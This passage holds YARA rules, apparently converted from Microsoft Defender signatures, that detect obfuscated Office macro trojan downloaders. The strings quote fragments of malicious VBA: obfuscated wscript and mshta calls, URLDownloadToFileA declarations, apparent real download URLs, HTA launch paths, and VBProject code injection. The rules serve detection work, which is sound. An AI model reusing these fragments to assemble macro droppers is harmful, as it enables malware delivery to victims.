        $x_1_3 = "Environ(\"W\" + \"i\" + \"n\" + \"\" + \"di\" + \"\" + \"\" + \"r\")" ascii //weight: 1
        $x_1_4 = "\"w\" + \"s\" + \"cr\" + \"\" + \"i\" + \"\" + \"p\" + \"t\" + \".\" + \"\" + \"e\" + \"x\" + \"\" + \"\" + \"\" + \"\" + \"e\"" ascii //weight: 1
        $x_1_5 = "BeHBQoFZK.CreateTextFile(ImcdyPbRx, True, True)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVU_2147779184_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVU!MTB"
        threat_id = "2147779184"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "titu = \"h\" + \"tt\" + \"ps\" + \"://bit\" + \".do/\" + \"fPQKY\"" ascii //weight: 1
        $x_1_2 = "u = \"ur\" & Chr(108) & Chr(109) & \"on\"" ascii //weight: 1
        $x_1_3 = "= \"=I\" + \"F(ISNUMBER(SEARCH(\"\"32\"\",GET.WORKSPACE(1))), GOTO(B127), GOTO(C127))\"" ascii //weight: 1
        $x_1_4 = "ExcelSheet.Range(\"A127\") = \"=ERR\" + \"OR\" + \"(FALSE)\"" ascii //weight: 1
        $x_1_5 = "(\"Co\" & Chr(109) & \"men\" & Chr(116) & \"s\").Value" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BB_2147779239_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BB!MTB"
        threat_id = "2147779239"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "zzzzh_b64 = zzzzh_b64 &" ascii //weight: 1
        $x_1_2 = "\"/lasdwe/bdaa3811-bb6c-42c7-ae25-0329f3a59ce1\", 436, zzzzh" ascii //weight: 1
        $x_1_3 = "DynMemcpy alloc, zzzzh, hread, hwrite" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BB_2147779239_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BB!MTB"
        threat_id = "2147779239"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= main.r(\"c:\\users\\public\\redLineSea.ht\")" ascii //weight: 1
        $x_1_2 = ".Content.Find.Execute FindText:=\"%_\", ReplaceWith:=\"\", Replace:=wdReplaceAll" ascii //weight: 1
        $x_1_3 = ".run lineLoveLady" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BB_2147779239_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BB!MTB"
        threat_id = "2147779239"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".ExpandEnvironmentStrings(\"%TEMP%\") & \"\\cym_16001380430BD84B24.exe\"" ascii //weight: 1
        $x_1_2 = "Based = Based & hcffgfawrenm(" ascii //weight: 1
        $x_1_3 = {26 20 43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 [0-15] 2c 20 [0-15] 2c 20 32 29 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BB_2147779239_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BB!MTB"
        threat_id = "2147779239"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 [0-12] 2c 20 [0-12] 2c 20 32 29 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = "= kuQWG9Jl(UserForm1.Label1.Caption)" ascii //weight: 1
        $x_1_3 = ".Environment(\"process\").Item(\"param1\") =" ascii //weight: 1
        $x_1_4 = ".run \"cmd /c call %param1%\", 2" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BB_2147779239_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BB!MTB"
        threat_id = "2147779239"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Split(afterBool, \"#\")" ascii //weight: 1
        $x_1_2 = "c:\\\\users\\\\public\\\\nameTpl.h" ascii //weight: 1
        $x_1_3 = "Optional refCnt = \"t\", Optional lBDocument = \"a\")" ascii //weight: 1
        $x_1_4 = "= responseDeleteResponse & convertScr & \"\" & refCnt & lBDocument" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVW_2147779257_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVW!MTB"
        threat_id = "2147779257"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_2 = "ddzdqsdff() & \"\\\" + rmlkejgmlkdfjgri(2) + \".exe\"" ascii //weight: 1
        $x_1_3 = "PxPToxhq.Open \"GET\", sdqsldjkf, False" ascii //weight: 1
        $x_1_4 = "slkfjdfjhglkjdshze.Run XxX, 1, True" ascii //weight: 1
        $x_1_5 = "str & Mid(LETTERS, Int(strLen * Rnd + 1))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_ARY_2147779318_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.ARY!MTB"
        threat_id = "2147779318"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Join(Array(Chr(CLng((" ascii //weight: 1
        $x_1_2 = {3d 20 57 65 65 6b 64 61 79 28 [0-22] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 53 70 6c 69 74 28 [0-16] 2c 20 [0-16] 2c 20 [0-16] 29}  //weight: 1, accuracy: Low
        $x_1_4 = "= IsDate(CLng((" ascii //weight: 1
        $x_1_5 = "Debug.Print" ascii //weight: 1
        $x_1_6 = {3d 20 52 65 70 6c 61 63 65 28 [0-24] 2c 20 [0-24] 2c 20 [0-24] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BRV_2147779326_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BRV!MTB"
        threat_id = "2147779326"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "K = \"diamantesviagens.com.br/\"" ascii //weight: 1
        $x_1_2 = "T = \"VirusEmHta.mp3\"" ascii //weight: 1
        $x_1_3 = "meinkonhun.EXEC pings" ascii //weight: 1
        $x_1_4 = "GetObject(\"\" + \"n\" + \"e\" + \"w\" + \":\" + " ascii //weight: 1
        $x_1_5 = "\" H\" + D + D + L + \"://\" + K + T" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_ZF_2147779364_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.ZF!MTB"
        threat_id = "2147779364"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "27"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Public Function getwc()" ascii //weight: 1
        $x_15_2 = "getwc = \"explorer.exe c:\\programdata\\nextTextClear.hta\"" ascii //weight: 15
        $x_15_3 = "getwc = \"explorer.exe c:\\programdata\\counterCountVb.hta\"" ascii //weight: 15
        $x_15_4 = "getwc = \"explorer.exe c:\\programdata\\procedureTemp.hta\"" ascii //weight: 15
        $x_15_5 = "getwc = \"explorer.exe c:\\programdata\\swapCounterVariable.hta\"" ascii //weight: 15
        $x_15_6 = "getwc = \"explorer.exe c:\\programdata\\queryLeft.hta\"" ascii //weight: 15
        $x_15_7 = "getwc = \"explorer.exe c:\\programdata\\responseSwapMem.hta\"" ascii //weight: 15
        $x_1_8 = "Public Sub button1_Click()" ascii //weight: 1
        $x_1_9 = "= CreateObject(\"wscript.shell\")" ascii //weight: 1
        $x_1_10 = ".exec p(getwc)" ascii //weight: 1
        $x_1_11 = {3d 20 52 65 70 6c 61 63 65 28 [0-25] 2c 20 [0-30] 2c 20 [0-25] 29}  //weight: 1, accuracy: Low
        $x_1_12 = "= Split(p(frm.getwc), \" \")" ascii //weight: 1
        $x_1_13 = {70 20 3d 20 [0-15] 28 [0-25] 2c 20 22 40 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_5_14 = {3d 20 61 6d 64 28 [0-35] 22 62 6f 64 79 3e 3c 2f 68 74 6d 6c 3e 22 29}  //weight: 5, accuracy: Low
        $x_5_15 = {3d 20 61 6d 64 28 22 3c 68 74 6d 6c 3e 3c 62 6f 64 79 3e 3c 64 69 76 20 69 64 3d 27 63 6f 6e 74 65 6e 74 27 3e 66 54 74 6c 63 32 39 73 59 79 35 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 22 29}  //weight: 5, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_15_*) and 1 of ($x_5_*) and 7 of ($x_1_*))) or
            ((1 of ($x_15_*) and 2 of ($x_5_*) and 2 of ($x_1_*))) or
            ((2 of ($x_15_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_ZD_2147779574_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.ZD!MTB"
        threat_id = "2147779574"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "14"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 4f 70 65 6e 20 [0-70] 2e 56 61 6c 75 65 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_2 = ".SetOption 2, .GetOption(2)" ascii //weight: 1
        $x_1_3 = {3d 20 49 6e 53 74 72 28 [0-20] 2c 20 [0-20] 2c 20 [0-20] 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 53 70 6c 69 74 28 [0-10] 2c 20 [0-10] 2c 20 [0-20] 29}  //weight: 1, accuracy: Low
        $x_1_5 = "If .Status = 200 Then" ascii //weight: 1
        $x_1_6 = {3d 20 41 74 6e 28 [0-20] 29}  //weight: 1, accuracy: Low
        $x_1_7 = {3d 20 52 65 70 6c 61 63 65 28 [0-10] 2c 20 [0-10] 2c 20 [0-20] 29}  //weight: 1, accuracy: Low
        $x_1_8 = {3d 20 41 62 73 28 43 4c 6e 67 28 28 28 [0-30] 20 2a 20 [0-20] 29}  //weight: 1, accuracy: Low
        $x_1_9 = {45 78 70 28 [0-10] 29}  //weight: 1, accuracy: Low
        $x_1_10 = {59 65 61 72 28 [0-15] 29}  //weight: 1, accuracy: Low
        $x_1_11 = {3d 20 57 65 65 6b 64 61 79 28 [0-15] 29}  //weight: 1, accuracy: Low
        $x_1_12 = {3d 20 4d 6f 6e 74 68 4e 61 6d 65 28 ?? 29}  //weight: 1, accuracy: Low
        $x_1_13 = {56 61 72 54 79 70 65 28 [0-10] 29}  //weight: 1, accuracy: Low
        $x_1_14 = "Debug.Print" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PLM_2147779597_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PLM!MTB"
        threat_id = "2147779597"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Debug.Print MsgBox(\"ERROR!\", vbOKCancel); returns; 1" ascii //weight: 1
        $x_1_2 = "= \"mshta" ascii //weight: 1
        $x_1_3 = "= \"https://www.bitly.com/\"" ascii //weight: 1
        $x_1_4 = {3d 20 22 6b 64 64 6a [0-15] 77 69 22}  //weight: 1, accuracy: Low
        $x_1_5 = {44 65 62 75 67 2e 50 72 69 6e 74 20 58 02 00 44 65 62 75 67 2e 50 72 69 6e 74 20 59 02 00 44 65 62 75 67 2e 50 72 69 6e 74 20 5a}  //weight: 1, accuracy: Low
        $x_1_6 = {44 65 62 75 67 2e 50 72 69 6e 74 20 28 53 68 65 6c 6c 28 58 20 2b 20 59 20 2b 20 5a 29 29 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_ZJ_2147779601_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.ZJ!MTB"
        threat_id = "2147779601"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {65 78 70 6c 6f 72 65 72 2e 65 78 65 20 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c [0-32] 2e 68 74 61 22}  //weight: 1, accuracy: Low
        $x_1_2 = "Public Sub button1_Click()" ascii //weight: 1
        $x_1_3 = "= CreateObject(\"wscript.shell\")" ascii //weight: 1
        $x_1_4 = ".exec p(rm)" ascii //weight: 1
        $x_1_5 = {3d 20 52 65 70 6c 61 63 65 28 [0-25] 2c 20 [0-30] 2c 20 [0-25] 29}  //weight: 1, accuracy: Low
        $x_1_6 = "= Split(p(frm.rm), \" \")" ascii //weight: 1
        $x_1_7 = {28 22 3c 68 74 6d 6c 3e 3c 62 6f 64 79 3e 3c 64 69 76 20 69 64 3d 27 63 6f 6e 74 65 6e 74 27 3e 66 54 74 6c 63 32 39 73 59 79 35 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DRV_2147779628_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DRV!MTB"
        threat_id = "2147779628"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "YJR_gPuBiPTKmVZ1nbBH_Uxnak" ascii //weight: 1
        $x_1_2 = "Chr(ds_f - 77)" ascii //weight: 1
        $x_1_3 = "d_fg(164) & d_fg(160) & d_fg(144) & d_fg(191) & d_fg(182) & d_fg(189) & d_fg(161) & d_fg(123) & d_fg(192) & d_fg(149) & d_fg(146) & d_fg(185) & d_fg(153)" ascii //weight: 1
        $x_1_4 = "gfghb bvcvnbc bvcncm" ascii //weight: 1
        $x_1_5 = "efoWL1kD.Run" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_ZK_2147779642_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.ZK!MTB"
        threat_id = "2147779642"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {65 78 70 6c 6f 72 65 72 2e 65 78 65 20 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c [0-32] 2e 68 74 61 22}  //weight: 1, accuracy: Low
        $x_1_2 = "Public Sub button1_Click()" ascii //weight: 1
        $x_1_3 = "= CreateObject(\"wscript.shell\")" ascii //weight: 1
        $x_1_4 = ".exec p(getwc)" ascii //weight: 1
        $x_1_5 = {3d 20 52 65 70 6c 61 63 65 28 [0-25] 2c 20 [0-30] 2c 20 [0-25] 29}  //weight: 1, accuracy: Low
        $x_1_6 = "= Split(p(frm.getwc), \" \")" ascii //weight: 1
        $x_1_7 = {28 22 3c 68 74 6d 6c 3e 3c 62 6f 64 79 3e 3c 64 69 76 20 69 64 3d 27 63 6f 6e 74 65 6e 74 27 3e 66 54 74 6c 63 32 39 73 59 79 35 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GRV_2147779896_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GRV!MTB"
        threat_id = "2147779896"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "retval = Shell(\"wscript.exe mozilla.vbs\")" ascii //weight: 1
        $x_1_2 = "Print #TextFile, Range(\"AH1607\").Value + Range(\"AH1606\").Value + Range(\"AH1605\").Value" ascii //weight: 1
        $x_1_3 = "FilePath = \"mozilla.vbs\"" ascii //weight: 1
        $x_1_4 = {57 6f 72 6b 62 6f 6f 6b 5f 4f 70 65 6e 28 29 02 00 6d 61 63 68 69 6e 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_NZN_2147779956_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.NZN!MTB"
        threat_id = "2147779956"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Private Declare Function E_Price_A Lib \"urlmon\" _" ascii //weight: 1
        $x_1_2 = "Alias \"URLDownloadToFileA\" ( _" ascii //weight: 1
        $x_1_3 = "(Split(kij(0), overdue_1(Oa))), directoo & \"\\\" & fillename, 0, 0" ascii //weight: 1
        $x_1_4 = "Sub freight_1()" ascii //weight: 1
        $x_1_5 = "Split(StrConv(m, 64), Chr(0)): For Each vv1 In v1: On Error Resume Next: k = k & Chr(Asc(vv1) + jj)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FRV_2147779957_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FRV!MTB"
        threat_id = "2147779957"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Shell k.clone.ControlTipText" ascii //weight: 1
        $x_1_2 = "k.opener.GroupName" ascii //weight: 1
        $x_1_3 = {53 75 62 20 5f 02 00 41 75 74 6f 5f 63 6c 6f 73 65 28 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_FRV_2147779957_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.FRV!MTB"
        threat_id = "2147779957"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "b___v = Chr(ds - 99)" ascii //weight: 1
        $x_1_2 = "b___v(186) & b___v(182) & b___v(166) & b___v(213) & b___v(204) & b___v(211) & b___v(183) & b___v(145) & b___v(214) & b___v(171) & b___v(168) & b___v(207) & b___v(175)" ascii //weight: 1
        $x_1_3 = "= \"iosadfodsi 5646 dsafdsyagf8 fisduerw98\"" ascii //weight: 1
        $x_1_4 = {53 75 62 20 [0-25] 28 29 0d 0a 68 68 66 67 67 68 67 66 66 20 3d 20 33 0d 0a 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_ZI_2147780065_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.ZI!MTB"
        threat_id = "2147780065"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Attribute VB_Name = \"cxczxc\"" ascii //weight: 1
        $x_1_2 = "Function Auto_Close() As String" ascii //weight: 1
        $x_1_3 = {53 68 65 6c 6c 20 63 61 6c 63 75 6c 61 74 6f 72 2e [0-20] 2e 54 61 67}  //weight: 1, accuracy: Low
        $x_1_4 = "End Function" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_ZM_2147780066_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.ZM!MTB"
        threat_id = "2147780066"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "<html><body><div id='content'>fTtlc29sYy5" ascii //weight: 1
        $x_1_2 = {3d 20 53 74 72 52 65 76 65 72 73 65 28 22 61 74 68 2e [0-30] 5c 61 74 61 64 6d 61 72 67 6f 72 70 5c 3a 63 20 65 78 65 2e 72 65 72 6f 6c 70 78 65 5c 73 77 6f 64 6e 69 77 5c 3a 63 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = "Public Sub button1_Click()" ascii //weight: 1
        $x_1_4 = "= GetObject(\"winmgmts:root\\cimv2:Win32_Process\")" ascii //weight: 1
        $x_1_5 = {2e 43 72 65 61 74 65 20 70 28 [0-5] 29}  //weight: 1, accuracy: Low
        $x_1_6 = {3d 20 53 70 6c 69 74 28 70 28 66 72 6d 2e [0-5] 29 2c 20 22 20 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KRN_2147780168_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KRN!MTB"
        threat_id = "2147780168"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 4f 70 65 6e 20 22 67 65 74 22 2c 20 [0-21] 28 22 71 [0-100] 6e 22 29 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 53 61 76 65 54 6f 46 69 6c 65 20 [0-12] 2c 20 [0-12] 20 2b 20}  //weight: 1, accuracy: Low
        $x_1_3 = {4d 73 67 42 6f 78 20 22 [0-21] 22}  //weight: 1, accuracy: Low
        $x_1_4 = "& \"\" = \"\" Then Exit Function" ascii //weight: 1
        $x_1_5 = "= Chr(50) + Chr(48) + Chr(48)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GBSE_2147780173_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GBSE!MTB"
        threat_id = "2147780173"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "namespaceGlobalRequest.DataType = \"bin.base64\"" ascii //weight: 1
        $x_1_2 = "= Chr$(Val(\"&H\" & Mid$(trustTextboxPtr, queryQueryText, 2)))" ascii //weight: 1
        $x_1_3 = "CreateObject(\"wscript.shell\").RegWrite argumentLink, 1, \"REG_DWORD\"" ascii //weight: 1
        $x_1_4 = "= StrConv(bufferData(\"SEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XE9mZmljZVw=\"), vbUnicode)" ascii //weight: 1
        $x_1_5 = "removeTable.VBProject.VBComponents(\"ThisDocument\").CodeModule.AddFromString listboxStorageCounter" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GBST_2147780251_0
{
    meta:
